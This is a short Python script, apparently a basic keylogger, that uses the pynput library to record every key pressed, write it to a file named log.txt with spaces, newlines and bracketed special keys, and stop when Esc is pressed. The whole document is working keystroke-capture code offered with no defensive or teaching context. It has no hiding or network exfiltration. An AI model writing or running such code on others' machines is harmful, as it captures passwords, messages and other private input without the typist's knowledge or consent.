from pynput.keyboard import Key, Listener

# The file where keystrokes will be saved
log_file = "log.txt"

def on_press(key):
    try:
        # Log alphanumeric keys
        with open("log.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Log special keys (Space, Enter, etc.)
        with open("log.txt", "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    # Stop the keylogger if the 'Esc' key is pressed
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()